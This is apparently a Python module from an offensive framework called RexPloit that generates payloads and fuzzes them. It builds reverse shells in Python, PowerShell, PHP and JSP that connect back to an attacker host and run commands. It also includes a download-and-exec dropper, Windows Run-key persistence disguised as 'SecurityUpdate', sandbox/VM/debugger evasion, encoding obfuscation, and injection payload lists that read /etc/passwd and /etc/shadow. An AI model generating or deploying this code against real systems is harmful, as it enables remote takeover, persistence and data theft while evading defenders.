#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Advanced Payload Generation and Fuzzing Module for RexPloit
Professional Penetration Testing Framework
For authorized security testing only
"""

import os
import sys
import json
import random
import string
import base64
import hashlib
import time
import re
import codecs
from datetime import datetime
from urllib.parse import quote, quote_plus

class AdvancedPayloadTemplates:
    """Advanced payload templates with multiple vectors and evasion techniques"""
    
    def __init__(self):
        self.templates = {
            # Advanced Python payloads
            "python_advanced": {
                "base": """
import socket,subprocess,os,threading,time,base64
def {func_name}():
    try:
        {obfuscation_block}
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('{lhost}',{lport}))
        {persistence_code}
        while True:
            data=s.recv(1024).decode()
            if len(data)==0:break
            {command_execution}
    except Exception as e:
        {error_handling}
        time.sleep({reconnect_delay})
        {func_name}()
{func_name}()
""",
                "variants": ["process_injection", "memory_execution", "steganographic"]
            },
            
            # Advanced PowerShell payloads
            "powershell_advanced": {
                "base": """
${var_socket} = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport})
${var_stream} = ${var_socket}.GetStream()
${var_writer} = New-Object System.IO.StreamWriter(${var_stream})
${var_buffer} = New-Object System.Byte[] 1024
${var_encoding} = New-Object System.Text.ASCIIEncoding
{obfuscation_block}
while(${var_socket}.Connected){{
    ${var_bytesRead} = ${var_stream}.Read(${var_buffer}, 0, 1024)
    if(${var_bytesRead} -gt 0){{
        {command_execution}
    }}
}}
""",
                "variants": ["amsi_bypass", "logging_evasion", "reflection_execution"]
            },
            
            # Web-based payloads
            "web_advanced": {
                "php": """<?php
{obfuscation_block}
$sock = fsockopen('{lhost}', {lport});
{persistence_code}
while(!feof($sock)){{
    $cmd = fread($sock, 1024);
    {command_execution}
}}
?>""",
                "jsp": """<%
{obfuscation_block}
java.net.Socket sock = new java.net.Socket("{lhost}", {lport});
{persistence_code}
java.io.InputStream is = sock.getInputStream();
java.io.OutputStream os = sock.getOutputStream();
{command_execution}
%>""",
                "variants": ["filter_bypass", "waf_evasion", "encoding_chains"]
            },
            
            # Staged payloads
            "staged_advanced": {
                "dropper": """
{obfuscation_block}
import urllib.request,base64,subprocess
try:
    {download_code}
    exec(base64.b64decode({payload_var}).decode())
except:
    {fallback_code}
""",
                "variants": ["multi_stage", "encrypted_stage", "domain_fronting"]
            },
            
            # Polymorphic payloads
            "polymorphic": {
                "base": """
{random_imports}
{decoy_functions}
{obfuscation_layer_1}
def {main_function}():
    {decoy_code}
    {obfuscation_layer_2}
    {actual_payload}
{random_calls}
{main_function}()
""",
                "variants": ["metamorphic", "encryption_layers", "code_caves"]
            }
        }
        
        # Obfuscation techniques
        self.obfuscation_techniques = {
            "string_encryption": self._encrypt_strings,
            "variable_mangling": self._mangle_variables,
            "code_injection": self._inject_decoy_code,
            "control_flow": self._obfuscate_control_flow,
            "encoding_chains": self._create_encoding_chains,
            "anti_analysis": self._add_anti_analysis
        }
        
        # Evasion techniques
        self.evasion_techniques = {
            "sandbox_detection": self._add_sandbox_detection,
            "debugger_detection": self._add_debugger_detection,
            "vm_detection": self._add_vm_detection,
            "delay_execution": self._add_delay_execution,
            "process_injection": self._add_process_injection,
            "fileless_execution": self._add_fileless_execution
        }

    def generate_advanced_payload(self, payload_type, lhost, lport, **options):
        """Generate advanced payload with specified options"""
        if payload_type not in self.templates:
            return None
            
        template_data = self.templates[payload_type]
        base_template = template_data.get("base", "")
        
        # Generate random function/variable names
        func_name = self._random_identifier()
        var_names = {
            'var_socket': self._random_identifier(),
            'var_stream': self._random_identifier(),
            'var_writer': self._random_identifier(),
            'var_buffer': self._random_identifier(),
            'var_encoding': self._random_identifier(),
            'var_bytesRead': self._random_identifier(),
            'payload_var': self._random_identifier(),
            'main_function': self._random_identifier()
        }
        
        # Apply obfuscation
        obfuscation_level = options.get('obfuscation_level', 'medium')
        obfuscation_block = self._generate_obfuscation_block(obfuscation_level)
        
        # Add evasion techniques
        evasion_level = options.get('evasion_level', 'basic')
        evasion_code = self._generate_evasion_code(evasion_level)
        
        # Add persistence mechanisms
        persistence_type = options.get('persistence', 'none')
        persistence_code = self._generate_persistence_code(persistence_type)
        
        # Generate command execution code
        execution_method = options.get('execution_method', 'subprocess')
        command_execution = self._generate_command_execution(execution_method)
        
        # Error handling and reconnection
        error_handling = self._generate_error_handling()
        reconnect_delay = random.randint(5, 30)
        
        # Substitute all variables
        payload = base_template.format(
            lhost=lhost,
            lport=lport,
            func_name=func_name,
            obfuscation_block=obfuscation_block,
            persistence_code=persistence_code,
            command_execution=command_execution,
            error_handling=error_handling,
            reconnect_delay=reconnect_delay,
            **var_names
        )
        
        # Apply post-processing
        if options.get('polymorphic', False):
            payload = self._apply_polymorphic_transformation(payload)
            
        if options.get('encoding', None):
            payload = self._apply_encoding(payload, options['encoding'])
            
        return payload

    def _random_identifier(self, length=8):
        """Generate random identifier"""
        first_char = random.choice(string.ascii_letters + '_')
        rest_chars = ''.join(random.choices(string.ascii_letters + string.digits + '_', k=length-1))
        return first_char + rest_chars

    def _generate_obfuscation_block(self, level):
        """Generate obfuscation code block"""
        if level == 'basic':
            return f"# {self._random_identifier()}"
        elif level == 'medium':
            return f"""
{self._random_identifier()} = '{self._random_string(20)}'
{self._random_identifier()} = lambda x: x
"""
        else:  # advanced
            return f"""
import sys, os, random
{self._random_identifier()} = [random.randint(1,100) for _ in range(10)]
{self._random_identifier()} = lambda x,y: x^y if isinstance(x,int) and isinstance(y,int) else x
{self._random_identifier()} = {{'{self._random_string(5)}': '{self._random_string(10)}'}}
"""

    def _generate_evasion_code(self, level):
        """Generate evasion code"""
        evasion_blocks = []
        
        if level in ['medium', 'advanced']:
            # Basic sandbox detection
            evasion_blocks.append("""
import time, os
if os.path.exists('/proc/version'):
    with open('/proc/version', 'r') as f:
        if 'virtual' in f.read().lower():
            time.sleep(300)
""")
        
        if level == 'advanced':
            # Advanced evasion
            evasion_blocks.append("""
import psutil
if len([p for p in psutil.process_iter() if 'wireshark' in p.name().lower()]) > 0:
    exit()
""")
        
        return '\n'.join(evasion_blocks)

    def _generate_persistence_code(self, persistence_type):
        """Generate persistence code"""
        if persistence_type == 'registry':
            return """
import winreg
key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_SET_VALUE)
winreg.SetValueEx(key, 'SecurityUpdate', 0, winreg.REG_SZ, sys.executable)
winreg.CloseKey(key)
"""
        elif persistence_type == 'crontab':
            return """
import subprocess
subprocess.run(['crontab', '-l'], capture_output=True)
"""
        else:
            return "# No persistence"

    def _generate_command_execution(self, method):
        """Generate command execution code"""
        if method == 'subprocess':
            return """
proc = subprocess.run(data, shell=True, capture_output=True, text=True)
result = proc.stdout + proc.stderr
s.send(result.encode())
"""
        elif method == 'eval':
            return """
try:
    result = str(eval(data))
except:
    result = 'Error executing command'
s.send(result.encode())
"""
        else:
            return """
os.system(data)
s.send(b'Command executed\\n')
"""

    def _generate_error_handling(self):
        """Generate error handling code"""
        return """
pass  # Silent error handling
"""

    def _random_string(self, length):
        """Generate random string"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    def _apply_polymorphic_transformation(self, payload):
        """Apply polymorphic transformations"""
        # Add random comments
        lines = payload.split('\n')
        for i in range(0, len(lines), random.randint(2, 5)):
            if i < len(lines):
                lines.insert(i, f"# {self._random_string(random.randint(10, 30))}")
        
        return '\n'.join(lines)

    def _apply_encoding(self, payload, encoding_type):
        """Apply encoding to payload"""
        if encoding_type == 'base64':
            encoded = base64.b64encode(payload.encode()).decode()
            return f"import base64; exec(base64.b64decode('{encoded}').decode())"
        elif encoding_type == 'hex':
            hex_encoded = payload.encode().hex()
            return f"exec(bytes.fromhex('{hex_encoded}').decode())"
        elif encoding_type == 'rot13':
            import codecs
            rot13 = codecs.encode(payload, 'rot13')
            return f"import codecs; exec(codecs.decode('{rot13}', 'rot13'))"
        else:
            return payload

    def _encrypt_strings(self, payload):
        """Encrypt strings in payload"""
        # Simple XOR encryption for strings
        strings = re.findall(r"'([^']*)'", payload)
        for s in strings:
            if len(s) > 3:  # Only encrypt longer strings
                key = random.randint(1, 255)
                encrypted = ''.join(chr(ord(c) ^ key) for c in s)
                encrypted_hex = encrypted.encode('latin1').hex()
                decrypt_code = f"bytes.fromhex('{encrypted_hex}').decode('latin1')"
                payload = payload.replace(f"'{s}'", f"''.join(chr(ord(c)^{key}) for c in {decrypt_code})")
        return payload

    def _mangle_variables(self, payload):
        """Mangle variable names"""
        # Find common variable names and replace with random ones
        common_vars = ['data', 'result', 'cmd', 'output', 'response']
        for var in common_vars:
            if var in payload:
                new_var = self._random_identifier()
                payload = re.sub(r'\b' + var + r'\b', new_var, payload)
        return payload

    def _inject_decoy_code(self, payload):
        """Inject decoy code"""
        decoy_lines = [
            f"{self._random_identifier()} = {random.randint(1, 1000)}",
            f"if {random.randint(1, 100)} > 50: pass",
            f"# {self._random_string(20)}",
            f"{self._random_identifier()} = '{self._random_string(15)}'"
        ]
        
        lines = payload.split('\n')
        for i in range(0, len(lines), random.randint(3, 8)):
            if i < len(lines):
                lines.insert(i, random.choice(decoy_lines))
        
        return '\n'.join(lines)

    def _obfuscate_control_flow(self, payload):
        """Obfuscate control flow"""
        # Add unnecessary but functional code
        obfuscated = f"""
{self._random_identifier()} = lambda: True
if {self._random_identifier()}():
{payload}
"""
        return obfuscated

    def _create_encoding_chains(self, payload):
        """Create multiple encoding layers"""
        # Apply multiple encodings
        encoded = payload
        for _ in range(random.randint(2, 4)):
            encoding_type = random.choice(['base64', 'hex'])
            encoded = self._apply_encoding(encoded, encoding_type)
        return encoded

    def _add_anti_analysis(self, payload):
        """Add anti-analysis techniques"""
        anti_analysis = """
import sys, os
if hasattr(sys, 'gettrace') and sys.gettrace() is not None:
    exit()
if 'VIRTUAL' in os.environ.get('COMPUTERNAME', '').upper():
    exit()
"""
        return anti_analysis + '\n' + payload

    def _add_sandbox_detection(self, payload):
        """Add sandbox detection"""
        detection = """
import os, time
if os.path.exists('/usr/bin/qemu-system-x86_64') or os.path.exists('/proc/vz'):
    time.sleep(300)
"""
        return detection + '\n' + payload

    def _add_debugger_detection(self, payload):
        """Add debugger detection"""
        detection = """
import sys
if hasattr(sys, 'gettrace') and sys.gettrace():
    exit()
"""
        return detection + '\n' + payload

    def _add_vm_detection(self, payload):
        """Add VM detection"""
        detection = """
import subprocess, sys
try:
    result = subprocess.check_output(['dmidecode', '-s', 'system-manufacturer'], 
                                   stderr=subprocess.DEVNULL).decode().strip()
    if any(vm in result.lower() for vm in ['vmware', 'virtualbox', 'kvm', 'qemu']):
        sys.exit()
except:
    pass
"""
        return detection + '\n' + payload

    def _add_delay_execution(self, payload):
        """Add execution delay"""
        delay = f"""
import time, random
time.sleep(random.uniform(10, 60))
"""
        return delay + '\n' + payload

    def _add_process_injection(self, payload):
        """Add process injection capability"""
        injection = """
import subprocess, sys
try:
    # Simple process hollowing technique
    proc = subprocess.Popen([sys.executable, '-c', 'import time; time.sleep(3600)'])
    # Injection would happen here in real implementation
except:
    pass
"""
        return injection + '\n' + payload

    def _add_fileless_execution(self, payload):
        """Add fileless execution techniques"""
        fileless = """
import tempfile, os
# Execute from memory without touching disk
"""
        return fileless + '\n' + payload


class PayloadFuzzer:
    """Advanced payload fuzzing engine"""
    
    def __init__(self):
        self.mutation_strategies = [
            'character_substitution',
            'encoding_mutation',
            'structure_mutation',
            'semantic_mutation',
            'obfuscation_mutation'
        ]
        
        self.injection_vectors = [
            'sql_injection',
            'xss_injection', 
            'command_injection',
            'ldap_injection',
            'xpath_injection',
            'nosql_injection',
            'template_injection',
            'code_injection'
        ]

    def fuzz_payload(self, base_payload, iterations=100, mutation_rate=0.3):
        """Generate fuzzing variants of a payload"""
        variants = []
        
        for i in range(iterations):
            mutated = base_payload
            
            # Apply random mutations
            num_mutations = random.randint(1, max(1, int(len(self.mutation_strategies) * mutation_rate)))
            selected_mutations = random.sample(self.mutation_strategies, num_mutations)
            
            for mutation in selected_mutations:
                mutated = getattr(self, f"_{mutation}")(mutated)
            
            variants.append({
                'id': i + 1,
                'payload': mutated,
                'mutations_applied': selected_mutations,
                'timestamp': datetime.now().isoformat()
            })
        
        return variants

    def generate_injection_payloads(self, target_vector):
        """Generate injection payloads for specific vector"""
        if target_vector not in self.injection_vectors:
            return []
        
        return getattr(self, f"_generate_{target_vector}_payloads")()

    def _character_substitution(self, payload):
        """Apply character-level mutations"""
        if not payload:
            return payload
        
        mutated = list(payload)
        num_changes = random.randint(1, max(1, len(payload) // 50))
        
        for _ in range(num_changes):
            pos = random.randint(0, len(mutated) - 1)
            if mutated[pos].isalnum():
                # Substitute with similar character
                if mutated[pos].isdigit():
                    mutated[pos] = str(random.randint(0, 9))
                elif mutated[pos].islower():
                    mutated[pos] = random.choice(string.ascii_lowercase)
                elif mutated[pos].isupper():
                    mutated[pos] = random.choice(string.ascii_uppercase)
        
        return ''.join(mutated)

    def _encoding_mutation(self, payload):
        """Apply encoding mutations"""
        encodings = ['url', 'html', 'unicode', 'double_url']
        encoding = random.choice(encodings)
        
        if encoding == 'url':
            return quote(payload, safe='')
        elif encoding == 'html':
            return ''.join(f'&#{ord(c)};' if random.random() < 0.3 else c for c in payload)
        elif encoding == 'unicode':
            return ''.join(f'\\u{ord(c):04x}' if random.random() < 0.2 else c for c in payload)
        elif encoding == 'double_url':
            return quote(quote(payload, safe=''), safe='')
        
        return payload

    def _structure_mutation(self, payload):
        """Apply structural mutations"""
        mutations = ['insert_nulls', 'duplicate_segments', 'truncate', 'padding']
        mutation = random.choice(mutations)
        
        if mutation == 'insert_nulls':
            # Insert null bytes
            positions = random.sample(range(len(payload)), min(3, len(payload)))
            for pos in sorted(positions, reverse=True):
                payload = payload[:pos] + '\x00' + payload[pos:]
        elif mutation == 'duplicate_segments':
            # Duplicate random segments
            if len(payload) > 10:
                start = random.randint(0, len(payload) - 10)
                end = start + random.randint(5, 10)
                segment = payload[start:end]
                payload = payload[:end] + segment + payload[end:]
        elif mutation == 'truncate':
            # Random truncation
            if len(payload) > 20:
                payload = payload[:random.randint(10, len(payload) - 10)]
        elif mutation == 'padding':
            # Add padding
            padding_chars = [' ', '\t', '\n', '\r', '\x00']
            padding = ''.join(random.choices(padding_chars, k=random.randint(1, 10)))
            payload = padding + payload + padding
        
        return payload

    def _semantic_mutation(self, payload):
        """Apply semantic mutations"""
        # Replace keywords with alternatives
        replacements = {
            'AND': ['&&', '&'],
            'OR': ['||', '|'],
            'SELECT': ['SeLeCt', 'select'],
            'UNION': ['UnIoN', 'union'],
            'script': ['Script', 'SCRIPT'],
            'alert': ['Alert', 'ALERT'],
            'eval': ['Eval', 'EVAL']
        }
        
        for original, alternatives in replacements.items():
            if original in payload:
                replacement = random.choice(alternatives)
                payload = payload.replace(original, replacement)
        
        return payload

    def _obfuscation_mutation(self, payload):
        """Apply obfuscation mutations"""
        techniques = ['comment_injection', 'case_variation', 'whitespace_variation']
        technique = random.choice(techniques)
        
        if technique == 'comment_injection':
            # Inject comments
            comment_styles = ['/**/', '<!---->']
            comment = random.choice(comment_styles)
            insertion_points = random.sample(range(len(payload)), min(3, len(payload)))
            for pos in sorted(insertion_points, reverse=True):
                payload = payload[:pos] + comment + payload[pos:]
        elif technique == 'case_variation':
            # Vary case randomly
            payload = ''.join(c.upper() if random.random() < 0.3 else c.lower() 
                            if c.isalpha() else c for c in payload)
        elif technique == 'whitespace_variation':
            # Vary whitespace
            whitespace_chars = [' ', '\t', '\r', '\n']
            payload = re.sub(r'\s+', lambda m: random.choice(whitespace_chars), payload)
        
        return payload

    def _generate_sql_injection_payloads(self):
        """Generate SQL injection payloads"""
        return [
            "' OR '1'='1",
            "' UNION SELECT null,null,null--",
            "'; DROP TABLE users; --",
            "' OR 1=1 --",
            "admin'--",
            "' OR 'x'='x",
            "1' AND 1=1 --",
            "' UNION ALL SELECT null,null,null,null,null --",
            "') OR ('1'='1",
            "' OR '1'='1' /*",
        ]

    def _generate_xss_injection_payloads(self):
        """Generate XSS injection payloads"""
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input autofocus onfocus=alert('XSS')>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
        ]

    def _generate_command_injection_payloads(self):
        """Generate command injection payloads"""
        return [
            "; ls -la",
            "| cat /etc/passwd",
            "&& whoami",
            "; cat /etc/shadow",
            "| id",
            "&& cat /proc/version",
            "; uname -a",
            "| ps aux",
            "&& netstat -an",
            "; ifconfig",
        ]

    def _generate_ldap_injection_payloads(self):
        """Generate LDAP injection payloads"""
        return [
            "*)(uid=*))(|(uid=*",
            "*)(|(cn=*))",
            "admin)(&(password=*))",
            "*))%00",
            "*)(&(password=*))",
            "*)(|(objectClass=*))",
            "admin))(|(cn=*",
            "*)(uid=admin))(|(uid=*",
        ]

    def _generate_xpath_injection_payloads(self):
        """Generate XPath injection payloads"""
        return [
            "' or '1'='1",
            "' or ''='",
            "x' or 1=1 or 'x'='y",
            "'] | //user/*[contains(*,'admin')] | //node()[contains(.,'",
            "' or 1=1 or ''='",
            "count(/child::node())",
            "x' or name()='username' or 'x'='y",
        ]

    def _generate_nosql_injection_payloads(self):
        """Generate NoSQL injection payloads"""
        return [
            "true, $where: '1 == 1'",
            "$ne: 1",
            "{$gt: ''}",
            "[$ne]=1",
            "{$regex: '.*'}",
            "$where: 'this.password.match(/.*/)' ",
            "'; return this.a != 3; var dummy='",
            "1'; return 'a' == 'a' && ''=='",
        ]

    def _generate_template_injection_payloads(self):
        """Generate template injection payloads"""
        return [
            "{{7*7}}",
            "${7*7}",
            "<%=7*7%>",
            "{{config}}",
            "${T(java.lang.System).getProperty('user.name')}",
            "{{''.__class__.__mro__[2].__subclasses__()}}",
            "{%debug%}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        ]

    def _generate_code_injection_payloads(self):
        """Generate code injection payloads"""
        return [
            "__import__('os').system('ls')",
            "eval('__import__(\"os\").system(\"whoami\")')",
            "exec('import os; os.system(\"id\")')",
            "compile('__import__(\"os\").system(\"uname -a\")', 'string', 'exec')",
            "globals()['__builtins__']['eval']('__import__(\"os\").system(\"ps\")')",
            "__import__('subprocess').call(['ls', '-la'])",
            "getattr(__import__('os'), 'system')('cat /etc/passwd')",
        ]